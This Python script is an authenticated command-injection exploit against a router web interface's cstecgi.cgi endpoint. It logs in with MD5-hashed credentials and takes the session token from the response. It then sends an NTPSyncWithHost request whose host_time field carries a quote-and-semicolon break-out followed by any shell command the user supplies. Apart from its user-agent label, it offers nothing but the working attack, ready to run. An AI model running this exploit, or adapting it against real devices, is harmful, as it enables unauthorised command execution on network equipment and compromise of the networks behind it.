import argparse
import hashlib
import json
import sys
from urllib.parse import urljoin, urlparse, parse_qs

import requests
requests.packages.urllib3.disable_warnings()

TOPIC_DEFAULT = "NTPSyncWithHost"

def md5_hex(s: str) -> str:
    return hashlib.md5(s.encode("utf-8")).hexdigest()

def build_login_body(user: str, password: str) -> str:
    u = md5_hex(user)
    p = md5_hex(password)
    body = {"username": u, "password": p, "flag": "0", "topicurl": "loginAuth"}
    return json.dumps(body, separators=(",", ":"))

def extract_token_from_login_json(j: dict) -> str | None:
    if isinstance(j, dict) and j.get("token"):
        return j["token"]
    jp = j.get("jump_page")
    if isinstance(jp, str):
        parsed = urlparse(jp)
        from urllib.parse import parse_qs
        q = parse_qs(parsed.query)
        tok = q.get("token", [None])[0]
        if tok:
            return tok
    return None

def login_get_token(base_url: str, user: str, password: str, timeout: int = 10) -> str:
    login_url = urljoin(base_url, "/cgi-bin/cstecgi.cgi")
    headers = {
        "Host": urlparse(base_url).netloc,
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
        "Referer": urljoin(base_url, "/login.html"),
        "User-Agent": "safe-cstecgi-test/1.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
    }
    body_text = build_login_body(user, password)

    resp = requests.post(login_url, headers=headers, data=body_text, timeout=timeout, verify=False)
    print(f"[+] Login HTTP {resp.status_code}")
    resp.raise_for_status()
    try:
        j = resp.json()
    except ValueError:
        raise RuntimeError(f"Login response is not JSON: {resp.text[:200]!r}")
    tok = extract_token_from_login_json(j) or resp.cookies.get("token")
    if not tok:
        raise RuntimeError(f"Token not found. Response (part of JSON): {str(j)[:200]}")
    return tok

def send_topic(base_url: str, token: str, payload: dict, timeout: int = 10):
    url = urljoin(base_url, f"/cgi-bin/cstecgi.cgi?token={token}")
    headers = {
        "Host": urlparse(base_url).netloc,
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "safe-cstecgi-test/1.0",
        "Accept": "application/json, text/plain, */*",
    }
    body = {"topicurl": TOPIC_DEFAULT, **payload}
    body_text = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
    print("\n[*] Target Endpoint:", url)
    print("[*] Body   :", body_text)

    resp = requests.post(url, headers=headers, data=body_text.encode("utf-8"), timeout=timeout, verify=False)
    print(f"[+] Topic HTTP {resp.status_code}")
    resp.raise_for_status()
    try:
        return resp.json()
    except ValueError:
        return {"raw": resp.text}

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="ex: http://192.168.0.16")
    ap.add_argument("--id", default="admin", help="id(default: admin)")
    ap.add_argument("--password", required=True, help="password")
    ap.add_argument("--cmd", default="2025-10-18 13:45:00", help="ex: ls")
    args = ap.parse_args()

    base_url = args.host.rstrip("/")

    try:
        token = login_get_token(base_url, args.id, args.password)
        print(f"[+] Token: {token}")
    except Exception as e:
        print(f"[Error] login/Token failed: {e}", file=sys.stderr)
        sys.exit(1)

    payload = {"host_time": "2025-10-18 13:45:00 '; " + args.cmd +" #"}
    print(payload)
    try:
        resp = send_topic(base_url, token, payload)
        print("[+] cmd success!")
    except Exception as e:
        print(f"[error] cmd failed: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
